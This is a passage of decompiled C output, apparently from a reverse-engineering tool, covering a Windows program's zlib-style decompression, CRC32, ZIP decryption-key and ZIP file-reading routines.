      (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),puVar1);
      return iVar2;
    }
  }
  else {
    if (iVar2 == -3) {
      *(undefined4 *)(param_9 + 0x18) = 0x421640;
      (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),puVar1);
      return -3;
    }
    if (iVar2 == -4) goto LAB_0040fb76;
  }
  *(undefined4 *)(param_9 + 0x18) = 0x421620;
  iVar2 = -3;
LAB_0040fb76:
  (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),puVar1);
  return iVar2;
}

undefined4 __cdecl
FUN_0040fb90(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4)

{
  *param_1 = 9;
  *param_2 = 5;
  *param_3 = 0x41a2a8;
  *param_4 = 0x41b2a8;
  return 0;
}

undefined4 __cdecl
FUN_0040fbc0(int param_1,byte *param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  uint uVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  byte bVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  uint uVar9;
  uint uVar10;
  byte *pbVar11;
  byte *pbVar12;
  uint uVar13;
  undefined *puVar14;
  undefined *puVar15;
  undefined *puVar16;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  
  pbVar11 = *param_6;
  local_14 = param_6[1];
  uVar9 = *(uint *)(param_5 + 0x20);
  puVar16 = *(undefined **)(param_5 + 0x34);
  uVar4 = *(uint *)(param_5 + 0x1c);
  if (puVar16 < *(undefined **)(param_5 + 0x30)) {
    local_10 = *(undefined **)(param_5 + 0x30) + (-1 - (int)puVar16);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_5 + 0x2c) - (int)puVar16);
  }
  uVar1 = *(uint *)(&DAT_0041a260 + param_1 * 4);
  uVar2 = *(uint *)(&DAT_0041a260 + (int)param_2 * 4);
  local_c = pbVar11;
  do {
    while (uVar4 < 0x14) {
      local_14 = local_14 + -1;
      bVar5 = (byte)uVar4;
      uVar4 = uVar4 + 8;
      uVar9 = uVar9 | (uint)*pbVar11 << (bVar5 & 0x1f);
      pbVar11 = pbVar11 + 1;
      local_c = pbVar11;
    }
    bVar5 = *(byte *)(param_3 + (uVar1 & uVar9) * 8);
    iVar8 = param_3 + (uVar1 & uVar9) * 8;
    if (bVar5 == 0) {
LAB_0040fe15:
      uVar9 = uVar9 >> (*(byte *)(iVar8 + 1) & 0x1f);
      uVar4 = uVar4 - *(byte *)(iVar8 + 1);
      *puVar16 = *(undefined *)(iVar8 + 4);
      puVar16 = puVar16 + 1;
      local_10 = local_10 + -1;
    }
    else {
      uVar9 = uVar9 >> (*(byte *)(iVar8 + 1) & 0x1f);
      uVar4 = uVar4 - *(byte *)(iVar8 + 1);
      while ((bVar5 & 0x10) == 0) {
        if ((bVar5 & 0x40) != 0) {
          if ((bVar5 & 0x20) != 0) {
            pbVar12 = param_6[1] + -(int)local_14;
            if ((byte *)(uVar4 >> 3) < param_6[1] + -(int)local_14) {
              pbVar12 = (byte *)(uVar4 >> 3);
            }
            *(uint *)(param_5 + 0x20) = uVar9;
            *(int *)(param_5 + 0x1c) = uVar4 + (int)pbVar12 * -8;
            pbVar3 = *param_6;
            param_6[1] = pbVar12 + (int)local_14;
            *param_6 = pbVar11 + -(int)pbVar12;
            param_6[2] = param_6[2] + (int)(pbVar11 + -(int)pbVar12 + -(int)pbVar3);
            *(undefined **)(param_5 + 0x34) = puVar16;
            return 1;
          }
          *(char **)(param_6 + 6) = s_invalid_literal_length_code_00421544;
          param_2 = (byte *)(uVar4 >> 3);
          pbVar12 = param_6[1] + -(int)local_14;
          if (param_6[1] + -(int)local_14 <= param_2) goto LAB_0040ff44;
          goto LAB_0040ff48;
        }
        iVar6 = (*(uint *)(&DAT_0041a260 + (uint)bVar5 * 4) & uVar9) + *(int *)(iVar8 + 4);
        bVar5 = *(byte *)(iVar8 + iVar6 * 8);
        iVar8 = iVar8 + iVar6 * 8;
        if (bVar5 == 0) goto LAB_0040fe15;
        uVar9 = uVar9 >> (*(byte *)(iVar8 + 1) & 0x1f);
        uVar4 = uVar4 - *(byte *)(iVar8 + 1);
      }
      uVar10 = (uint)bVar5 & 0xf;
      uVar4 = uVar4 - uVar10;
      uVar7 = (*(uint *)(&DAT_0041a260 + uVar10 * 4) & uVar9) + *(int *)(iVar8 + 4);
      uVar9 = uVar9 >> (sbyte)uVar10;
      while (uVar4 < 0xf) {
        local_14 = local_14 + -1;
        bVar5 = (byte)uVar4;
        uVar4 = uVar4 + 8;
        uVar9 = uVar9 | (uint)*pbVar11 << (bVar5 & 0x1f);
        pbVar11 = pbVar11 + 1;
        local_c = pbVar11;
      }
      bVar5 = *(byte *)(param_4 + (uVar2 & uVar9) * 8);
      iVar8 = param_4 + (uVar2 & uVar9) * 8;
      uVar9 = uVar9 >> (*(byte *)(iVar8 + 1) & 0x1f);
      uVar4 = uVar4 - *(byte *)(iVar8 + 1);
      while ((bVar5 & 0x10) == 0) {
        if ((bVar5 & 0x40) != 0) {
          *(char **)(param_6 + 6) = s_invalid_distance_code_0042152c;
          param_2 = (byte *)(uVar4 >> 3);
          pbVar12 = param_6[1] + -(int)local_14;
          if (param_6[1] + -(int)local_14 <= param_2) {
LAB_0040ff44:
            param_2 = pbVar12;
          }
LAB_0040ff48:
          *(uint *)(param_5 + 0x20) = uVar9;
          *(int *)(param_5 + 0x1c) = uVar4 + (int)param_2 * -8;
          param_6[1] = param_2 + (int)local_14;
          pbVar12 = *param_6;
          *param_6 = pbVar11 + -(int)param_2;
          param_6[2] = param_6[2] + (int)(pbVar11 + -(int)param_2 + -(int)pbVar12);
          *(undefined **)(param_5 + 0x34) = puVar16;
          return 0xfffffffd;
        }
        iVar6 = (*(uint *)(&DAT_0041a260 + (uint)bVar5 * 4) & uVar9) + *(int *)(iVar8 + 4);
        bVar5 = *(byte *)(iVar8 + iVar6 * 8);
        iVar8 = iVar8 + iVar6 * 8;
        uVar9 = uVar9 >> (*(byte *)(iVar8 + 1) & 0x1f);
        uVar4 = uVar4 - *(byte *)(iVar8 + 1);
      }
      uVar10 = (uint)bVar5 & 0xf;
      pbVar12 = pbVar11;
      pbVar11 = local_c;
      while (uVar4 < uVar10) {
        local_14 = local_14 + -1;
        bVar5 = (byte)uVar4;
        uVar4 = uVar4 + 8;
        uVar9 = uVar9 | (uint)*pbVar12 << (bVar5 & 0x1f);
        pbVar12 = pbVar11 + 1;
        pbVar11 = pbVar12;
      }
      uVar13 = *(uint *)(&DAT_0041a260 + uVar10 * 4) & uVar9;
      uVar9 = uVar9 >> (sbyte)uVar10;
      uVar4 = uVar4 - uVar10;
      local_10 = local_10 + -uVar7;
      puVar14 = puVar16 + -(uVar13 + *(int *)(iVar8 + 4));
      puVar15 = *(undefined **)(param_5 + 0x28);
      local_c = pbVar11;
      if (puVar14 < puVar15) {
        do {
          puVar14 = puVar14 + (*(int *)(param_5 + 0x2c) - (int)puVar15);
        } while (puVar14 < puVar15);
        uVar10 = *(int *)(param_5 + 0x2c) - (int)puVar14;
        if (uVar10 < uVar7) {
          iVar8 = uVar7 - uVar10;
          do {
            *puVar16 = *puVar14;
            puVar16 = puVar16 + 1;
            puVar14 = puVar14 + 1;
            uVar10 = uVar10 - 1;
          } while (uVar10 != 0);
          puVar15 = *(undefined **)(param_5 + 0x28);
          do {
            *puVar16 = *puVar15;
            puVar16 = puVar16 + 1;
            puVar15 = puVar15 + 1;
            iVar8 = iVar8 + -1;
          } while (iVar8 != 0);
        }
        else {
          *puVar16 = *puVar14;
          puVar16[1] = puVar14[1];
          puVar16 = puVar16 + 2;
          puVar14 = puVar14 + 2;
          iVar8 = uVar7 - 2;
          do {
            *puVar16 = *puVar14;
            puVar16 = puVar16 + 1;
            puVar14 = puVar14 + 1;
            iVar8 = iVar8 + -1;
          } while (iVar8 != 0);
        }
      }
      else {
        *puVar16 = *puVar14;
        puVar16[1] = puVar14[1];
        puVar16 = puVar16 + 2;
        puVar14 = puVar14 + 2;
        iVar8 = uVar7 - 2;
        do {
          *puVar16 = *puVar14;
          puVar16 = puVar16 + 1;
          puVar14 = puVar14 + 1;
          iVar8 = iVar8 + -1;
        } while (iVar8 != 0);
      }
    }
    if ((local_10 < (undefined *)0x102) || (local_14 < &DAT_0000000a)) {
      pbVar12 = param_6[1] + -(int)local_14;
      if ((byte *)(uVar4 >> 3) < param_6[1] + -(int)local_14) {
        pbVar12 = (byte *)(uVar4 >> 3);
      }
      *(uint *)(param_5 + 0x20) = uVar9;
      *(int *)(param_5 + 0x1c) = uVar4 + (int)pbVar12 * -8;
      pbVar3 = *param_6;
      param_6[1] = pbVar12 + (int)local_14;
      *param_6 = pbVar11 + -(int)pbVar12;
      param_6[2] = param_6[2] + (int)(pbVar11 + -(int)pbVar12 + -(int)pbVar3);
      *(undefined **)(param_5 + 0x34) = puVar16;
      return 0;
    }
  } while( true );
}

uint __cdecl FUN_0040ff90(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  
  if (param_2 == (byte *)0x0) {
    return 0;
  }
  param_1 = ~param_1;
  if (7 < param_3) {
    uVar2 = param_3 >> 3;
    do {
      param_3 = param_3 - 8;
      uVar1 = *(uint *)(&DAT_0041b60c + (param_1 & 0xff ^ (uint)*param_2) * 4) ^ param_1 >> 8;
      uVar1 = *(uint *)(&DAT_0041b60c + (uVar1 & 0xff ^ (uint)param_2[1]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0041b60c + (uVar1 & 0xff ^ (uint)param_2[2]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0041b60c + (uVar1 & 0xff ^ (uint)param_2[3]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0041b60c + (uVar1 & 0xff ^ (uint)param_2[4]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0041b60c + (uVar1 & 0xff ^ (uint)param_2[5]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0041b60c + (uVar1 & 0xff ^ (uint)param_2[6]) * 4) ^ uVar1 >> 8;
      param_1 = uVar1 >> 8 ^ *(uint *)(&DAT_0041b60c + (uVar1 & 0xff ^ (uint)param_2[7]) * 4);
      param_2 = param_2 + 8;
      uVar2 = uVar2 - 1;
    } while (uVar2 != 0);
  }
  while (param_3 != 0) {
    param_1 = param_1 >> 8 ^ *(uint *)(&DAT_0041b60c + (param_1 & 0xff ^ (uint)*param_2) * 4);
    param_2 = param_2 + 1;
    param_3 = param_3 - 1;
  }
  return ~param_1;
}

void __cdecl FUN_004100d0(uint *param_1,uint param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0041b60c + (*param_1 & 0xff ^ param_2 & 0xff) * 4) ^ *param_1 >> 8;
  *param_1 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_1[1]) * 0x8088405 + 1;
  param_1[1] = uVar1;
  param_1[2] = *(uint *)(&DAT_0041b60c + (uVar1 >> 0x18 ^ param_1[2] & 0xff) * 4) ^ param_1[2] >> 8;
  return;
}

uint __cdecl FUN_00410130(int param_1)

{
  uint uVar1;
  
  uVar1 = *(uint *)(param_1 + 8) & 0xfffd | 2;
  return (uVar1 ^ 1) * uVar1 >> 8 & 0xff;
}

uint __cdecl FUN_00410150(uint *param_1,uint param_2)

{
  uint uVar1;
  
  uVar1 = FUN_00410130((int)param_1);
  param_2._0_1_ = (byte)param_2 ^ (byte)uVar1;
  param_2 = param_2 & 0xffffff00 | (uint)(byte)param_2;
  uVar1 = FUN_004100d0(param_1,param_2);
  return uVar1 & 0xffffff00 | (uint)(byte)param_2;
}

undefined4 __cdecl FUN_004102e0(int param_1)

{
  uint *puVar1;
  
  if ((param_1 != 0) && (puVar1 = *(uint **)(param_1 + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(param_1 + 0x14) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    FUN_0040e720(*(int **)(*(int *)(param_1 + 0x1c) + 0x14),param_1,(int *)0x0);
    return 0;
  }
  return 0xfffffffe;
}

undefined4 __cdecl FUN_00410330(int param_1)

{
  int *piVar1;
  
  if (((param_1 != 0) && (*(int *)(param_1 + 0x1c) != 0)) && (*(int *)(param_1 + 0x24) != 0)) {
    piVar1 = *(int **)(*(int *)(param_1 + 0x1c) + 0x14);
    if (piVar1 != (int *)0x0) {
      FUN_0040f450(piVar1,param_1);
    }
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(param_1 + 0x1c));
    *(undefined4 *)(param_1 + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}

// WARNING: Removing unreachable block (ram,0x00410454)

undefined4 __cdecl FUN_00410380(int param_1)

{
  int iVar1;
  int *piVar2;
  
  if (param_1 == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(param_1 + 0x18) = 0;
  if (*(int *)(param_1 + 0x20) == 0) {
    *(undefined4 *)(param_1 + 0x20) = 0x4102b0;
    *(undefined4 *)(param_1 + 0x28) = 0;
  }
  if (*(int *)(param_1 + 0x24) == 0) {
    *(undefined4 *)(param_1 + 0x24) = 0x4102d0;
  }
  iVar1 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x18);
  *(int *)(param_1 + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0x10) = 0xf;
    piVar2 = FUN_0040e7a0(param_1,~-(uint)(*(int *)(*(int *)(param_1 + 0x1c) + 0xc) != 0) & 0x410180
                          ,0x8000);
    *(int **)(*(int *)(param_1 + 0x1c) + 0x14) = piVar2;
    if (*(int *)(*(int *)(param_1 + 0x1c) + 0x14) != 0) {
      FUN_004102e0(param_1);
      return 0;
    }
    FUN_00410330(param_1);
    return 0xfffffffc;
  }
  return 0xfffffffc;
}

uint __cdecl FUN_00410460(byte **param_1,int param_2)

{
  byte bVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  uint *puVar5;
  uint uVar6;
  uint uVar7;
  
  if (((param_1 == (byte **)0x0) || (puVar5 = (uint *)param_1[7], puVar5 == (uint *)0x0)) ||
     (*param_1 == (byte *)0x0)) {
    return 0xfffffffe;
  }
  uVar2 = *puVar5;
  uVar7 = 0xfffffffb;
  uVar6 = (uint)(param_2 != 4) - 1 & 0xfffffffb;
joined_r0x004104a2:
  if (0xd < uVar2) {
    return 0xfffffffe;
  }
  switch((&switchdataD_00410860)[uVar2]) {
  case (undefined *)0x4104b4:
    if (param_1[1] == (byte *)0x0) {
      return uVar7;
    }
    param_1[1] = param_1[1] + -1;
    param_1[2] = param_1[2] + 1;
    puVar5[1] = (uint)**param_1;
    puVar4 = (undefined4 *)param_1[7];
    uVar3 = puVar4[1];
    *param_1 = *param_1 + 1;
    if (((byte)uVar3 & 0xf) == 8) {
      if (((uint)puVar4[1] >> 4) + 8 <= (uint)puVar4[4]) {
        *puVar4 = 1;
        uVar7 = uVar6;
        goto switchD_004104ad_caseD_410522;
      }
      *puVar4 = 0xd;
      *(char **)(param_1 + 6) = s_invalid_window_size_004216fc;
    }
    else {
      *puVar4 = 0xd;
      *(char **)(param_1 + 6) = s_unknown_compression_method_00421710;
    }
    goto LAB_004106f7;
  case (undefined *)0x410522:
switchD_004104ad_caseD_410522:
    if (param_1[1] == (byte *)0x0) {
      return uVar7;
    }
    param_1[1] = param_1[1] + -1;
    puVar4 = (undefined4 *)param_1[7];
    param_1[2] = param_1[2] + 1;
    bVar1 = **param_1;
    *param_1 = *param_1 + 1;
    if ((puVar4[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
      if ((bVar1 & 0x20) != 0) {
        *(undefined4 *)param_1[7] = 2;
        uVar7 = uVar6;
        goto switchD_004104ad_caseD_410727;
      }
      *puVar4 = 7;
      uVar7 = uVar6;
    }
    else {
      *puVar4 = 0xd;
      *(char **)(param_1 + 6) = s_incorrect_header_check_004216e4;
      *(undefined4 *)(param_1[7] + 4) = 5;
      uVar7 = uVar6;
    }
    break;
  case (undefined *)0x410599:
    uVar7 = FUN_0040e840((uint *)puVar5[5],param_1,uVar7);
    if (uVar7 == 0xfffffffd) {
      *(undefined4 *)param_1[7] = 0xd;
      *(undefined4 *)(param_1[7] + 4) = 0;
    }
    else {
      if (uVar7 == 0) {
        uVar7 = uVar6;
      }
      if (uVar7 != 1) {
        return uVar7;
      }
      FUN_0040e720(*(int **)(param_1[7] + 0x14),(int)param_1,(int *)(param_1[7] + 4));
      puVar4 = (undefined4 *)param_1[7];
      if (puVar4[3] == 0) {
        *puVar4 = 8;
        uVar7 = uVar6;
        goto switchD_004104ad_caseD_410606;
      }
      *puVar4 = 0xc;
      uVar7 = uVar6;
    }
    break;
  case (undefined *)0x410606:
switchD_004104ad_caseD_410606:
    if (param_1[1] == (byte *)0x0) {
      return uVar7;
    }
    param_1[1] = param_1[1] + -1;
    param_1[2] = param_1[2] + 1;
    *(uint *)(param_1[7] + 8) = (uint)**param_1 << 0x18;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 9;
    uVar7 = uVar6;
  case (undefined *)0x41063b:
    if (param_1[1] == (byte *)0x0) {
      return uVar7;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x10000;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 10;
    uVar7 = uVar6;
  case (undefined *)0x410675:
    goto switchD_004104ad_caseD_410675;
  case (undefined *)0x4106af:
    goto switchD_004104ad_caseD_4106af;
  case (undefined *)0x410727:
switchD_004104ad_caseD_410727:
    if (param_1[1] == (byte *)0x0) {
      return uVar7;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = (uint)**param_1 << 0x18;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 3;
    uVar7 = uVar6;
  case (undefined *)0x41075f:
    if (param_1[1] == (byte *)0x0) {
      return uVar7;
    }
    param_1[1] = param_1[1] + -1;
    param_1[2] = param_1[2] + 1;
    *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x10000;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 4;
    uVar7 = uVar6;
  case (undefined *)0x41079c:
    goto switchD_004104ad_caseD_41079c;
  case (undefined *)0x4107d5:
    goto switchD_004104ad_caseD_4107d5;
  case (undefined *)0x41081d:
    *(undefined4 *)param_1[7] = 0xd;
    *(char **)(param_1 + 6) = s_need_dictionary_004214c4;
    *(undefined4 *)(param_1[7] + 4) = 0;
    return 0xfffffffe;
  case (undefined *)0x41084a:
    goto switchD_004104ad_caseD_41084a;
  case (undefined *)0x410854:
    return 0xfffffffd;
  }
LAB_004106fd:
  puVar5 = (uint *)param_1[7];
  uVar2 = *puVar5;
  goto joined_r0x004104a2;
switchD_004104ad_caseD_410675:
  if (param_1[1] == (byte *)0x0) {
    return uVar7;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x100;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 0xb;
  uVar7 = uVar6;
switchD_004104ad_caseD_4106af:
  if (param_1[1] == (byte *)0x0) {
    return uVar7;
  }
  param_1[1] = param_1[1] + -1;
  param_1[2] = param_1[2] + 1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1;
  *param_1 = *param_1 + 1;
  puVar4 = (undefined4 *)param_1[7];
  if (puVar4[1] == puVar4[2]) {
    *(undefined4 *)param_1[7] = 0xc;
switchD_004104ad_caseD_41084a:
    return 1;
  }
  *puVar4 = 0xd;
  *(char **)(param_1 + 6) = s_incorrect_data_check_004216cc;
LAB_004106f7:
  *(undefined4 *)(param_1[7] + 4) = 5;
  uVar7 = uVar6;
  goto LAB_004106fd;
switchD_004104ad_caseD_41079c:
  if (param_1[1] == (byte *)0x0) {
    return uVar7;
  }
  param_1[1] = param_1[1] + -1;
  param_1[2] = param_1[2] + 1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x100;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 5;
  uVar7 = uVar6;
switchD_004104ad_caseD_4107d5:
  if (param_1[1] == (byte *)0x0) {
    return uVar7;
  }
  param_1[1] = param_1[1] + -1;
  param_1[2] = param_1[2] + 1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1;
  *param_1 = *param_1 + 1;
  param_1[0xc] = *(byte **)(param_1[7] + 2);
  *(undefined4 *)param_1[7] = 6;
  return 2;
}

undefined * __cdecl FUN_004108a0(LPCSTR param_1,undefined4 param_2,int param_3,undefined4 *param_4)

{
  DWORD DVar1;
  undefined *puVar2;
  LPCSTR hFile;
  bool bVar3;
  
  if (((param_3 != 1) && (param_3 != 2)) && (param_3 != 3)) {
    *param_4 = 0x10000;
    return (undefined *)0x0;
  }
  hFile = (LPCSTR)0x0;
  bVar3 = false;
  *param_4 = 0;
  param_3._0_1_ = 0;
  if (param_3 == 1) {
    param_3._0_1_ = 0;
    hFile = param_1;
  }
  else {
    if (param_3 != 2) goto LAB_00410938;
    hFile = (LPCSTR)CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if (hFile == (LPCSTR)0xffffffff) {
      *param_4 = 0x200;
      return (undefined *)0x0;
    }
    param_3._0_1_ = 1;
  }
  DVar1 = SetFilePointer(hFile,0,(PLONG)0x0,1);
  bVar3 = DVar1 != 0xffffffff;
LAB_00410938:
  puVar2 = (undefined *)operator_new(0x20);
  if ((param_3 != 1) && (param_3 != 2)) {
    *(LPCSTR *)(puVar2 + 0x14) = param_1;
    *(undefined4 *)(puVar2 + 0x18) = param_2;
    *puVar2 = 0;
    puVar2[1] = 1;
    puVar2[0x10] = 0;
    *(undefined4 *)(puVar2 + 0x1c) = 0;
    *(undefined4 *)(puVar2 + 0xc) = 0;
    *param_4 = 0;
    return puVar2;
  }
  *puVar2 = 1;
  puVar2[0x10] = (undefined)param_3;
  *(bool *)(puVar2 + 1) = bVar3;
  *(LPCSTR *)(puVar2 + 4) = hFile;
  puVar2[8] = 0;
  *(undefined4 *)(puVar2 + 0xc) = 0;
  if (bVar3 != false) {
    DVar1 = SetFilePointer(hFile,0,(PLONG)0x0,1);
    *(DWORD *)(puVar2 + 0xc) = DVar1;
  }
  *param_4 = 0;
  return puVar2;
}

undefined4 __cdecl FUN_004109c0(void *param_1)

{
  if (param_1 == (void *)0x0) {
    return 0xffffffff;
  }
  if (*(char *)((int)param_1 + 0x10) != '\0') {
    CloseHandle(*(HANDLE *)((int)param_1 + 4));
  }
  operator_delete(param_1);
  return 0;
}

undefined4 __cdecl FUN_004109f0(char *param_1)

{
  if ((*param_1 != '\0') && (param_1[8] != '\0')) {
    return 1;
  }
  return 0;
}

int __cdecl FUN_00410a10(char *param_1)

{
  DWORD DVar1;
  
  if (*param_1 != '\0') {
    if (param_1[1] != '\0') {
      DVar1 = SetFilePointer(*(HANDLE *)(param_1 + 4),0,(PLONG)0x0,1);
      return DVar1 - *(int *)(param_1 + 0xc);
    }
    if (*param_1 != '\0') {
      return 0;
    }
  }
  return *(int *)(param_1 + 0x1c);
}

undefined4 __cdecl FUN_00410a50(char *param_1,int param_2,DWORD param_3)

{
  if (*param_1 != '\0') {
    if (param_1[1] != '\0') {
      if (param_3 == 0) {
        SetFilePointer(*(HANDLE *)(param_1 + 4),*(int *)(param_1 + 0xc) + param_2,(PLONG)0x0,0);
        return 0;
      }
      if ((param_3 != 1) && (param_3 != 2)) {
        return 0x13;
      }
      SetFilePointer(*(HANDLE *)(param_1 + 4),param_2,(PLONG)0x0,param_3);
      return 0;
    }
    if (*param_1 != '\0') {
      return 0x1d;
    }
  }
  if (param_3 == 0) {
    *(int *)(param_1 + 0x1c) = param_2;
    return 0;
  }
  if (param_3 != 1) {
    if (param_3 == 2) {
      *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x18) + param_2;
    }
    return 0;
  }
  *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x1c) + param_2;
  return 0;
}

uint __cdecl FUN_00410af0(undefined4 *param_1,uint param_2,int param_3,char *param_4)

{
  int iVar1;
  uint nNumberOfBytesToRead;
  BOOL BVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  nNumberOfBytesToRead = param_2 * param_3;
  if (*param_4 != '\0') {
    BVar2 = ReadFile(*(HANDLE *)(param_4 + 4),param_1,nNumberOfBytesToRead,(LPDWORD)&param_1,
                     (LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      param_4[8] = '\x01';
    }
    return (uint)param_1 / param_2;
  }
  iVar1 = *(int *)(param_4 + 0x1c);
  if (*(uint *)(param_4 + 0x18) < iVar1 + nNumberOfBytesToRead) {
    nNumberOfBytesToRead = *(uint *)(param_4 + 0x18) - iVar1;
  }
  uVar3 = nNumberOfBytesToRead >> 2;
  puVar4 = (undefined4 *)(*(int *)(param_4 + 0x14) + iVar1);
  while (uVar3 != 0) {
    uVar3 = uVar3 - 1;
    *param_1 = *puVar4;
    puVar4 = puVar4 + 1;
    param_1 = param_1 + 1;
  }
  uVar3 = nNumberOfBytesToRead & 3;
  while (uVar3 != 0) {
    uVar3 = uVar3 - 1;
    *(undefined *)param_1 = *(undefined *)puVar4;
    puVar4 = (undefined4 *)((int)puVar4 + 1);
    param_1 = (undefined4 *)((int)param_1 + 1);
  }
  *(uint *)(param_4 + 0x1c) = *(int *)(param_4 + 0x1c) + nNumberOfBytesToRead;
  return nNumberOfBytesToRead / param_2;
}

int __cdecl FUN_00410b70(char *param_1,uint *param_2)

{
  char *pcVar1;
  uint uVar2;
  int iVar3;
  
  pcVar1 = param_1;
  uVar2 = FUN_00410af0(&param_1,1,1,param_1);
  if (uVar2 == 1) {
    *param_2 = (uint)param_1 & 0xff;
    return 0;
  }
  iVar3 = FUN_004109f0(pcVar1);
  return -(uint)(iVar3 != 0);
}

void __cdecl FUN_00410bb0(char *param_1,char **param_2)

{
  char *pcVar1;
  char *pcVar2;
  int iVar3;
  
  pcVar1 = param_1;
  iVar3 = FUN_00410b70(param_1,(uint *)&param_1);
  pcVar2 = param_1;
  if (iVar3 == 0) {
    iVar3 = FUN_00410b70(pcVar1,(uint *)&param_1);
    if (iVar3 == 0) {
      *param_2 = pcVar2 + (int)param_1 * 0x100;
      return;
    }
  }
  *param_2 = (char *)0x0;
  return;
}

void __cdecl FUN_00410c00(char *param_1,char **param_2)

{
  char *pcVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  pcVar1 = param_1;
  iVar3 = FUN_00410b70(param_1,(uint *)&param_1);
  pcVar2 = param_1;
  if (iVar3 == 0) {
    iVar3 = FUN_00410b70(pcVar1,(uint *)&param_1);
  }
  iVar5 = (int)param_1 * 0x100;
  if (iVar3 == 0) {
    iVar3 = FUN_00410b70(pcVar1,(uint *)&param_1);
  }
  iVar4 = (int)param_1 * 0x10000;
  if (iVar3 == 0) {
    iVar3 = FUN_00410b70(pcVar1,(uint *)&param_1);
    if (iVar3 == 0) {
      *param_2 = pcVar2 + (int)param_1 * 0x1000000 + iVar4 + iVar5;
      return;
    }
  }
  *param_2 = (char *)0x0;
  return;
}

int __cdecl FUN_00410c90(char *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  undefined4 *_Memory;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint local_c;
  int local_8;
  
  iVar3 = FUN_00410a50(param_1,0,2);
  if (iVar3 != 0) {
    return -1;
  }
  uVar4 = FUN_00410a10(param_1);
  local_c = 0xffff;
  if (uVar4 < 0xffff) {
    local_c = uVar4;
  }
  _Memory = (undefined4 *)malloc(0x404);
  if (_Memory == (undefined4 *)0x0) {
    return -1;
  }
  uVar7 = 4;
  local_8 = -1;
  if (4 < local_c) {
    while( true ) {
      uVar8 = uVar7 + 0x400;
      uVar7 = local_c;
      if (uVar8 <= local_c) {
        uVar7 = uVar8;
      }
      iVar3 = uVar4 - uVar7;
      uVar8 = 0x404;
      if (uVar4 - iVar3 < 0x405) {
        uVar8 = uVar4 - iVar3;
      }
      iVar5 = FUN_00410a50(param_1,iVar3,0);
      if ((iVar5 != 0) || (uVar6 = FUN_00410af0(_Memory,uVar8,1,param_1), uVar6 != 1)) break;
      iVar2 = uVar8 - 4;
      iVar5 = uVar8 - 3;
      while (iVar1 = iVar2, -1 < iVar5) {
        if ((((*(char *)(iVar1 + (int)_Memory) == 'P') &&
             (*(char *)(iVar1 + 1 + (int)_Memory) == 'K')) &&
            (*(char *)(iVar1 + 2 + (int)_Memory) == '\x05')) &&
           (*(char *)(iVar1 + 3 + (int)_Memory) == '\x06')) {
          local_8 = iVar1 + iVar3;
          break;
        }
        iVar2 = iVar1 + -1;
        iVar5 = iVar1;
      }
      if ((local_8 != 0) || (local_c <= uVar7)) break;
    }
  }
  free(_Memory);
  return local_8;
}

// WARNING: Removing unreachable block (ram,0x00410de9)

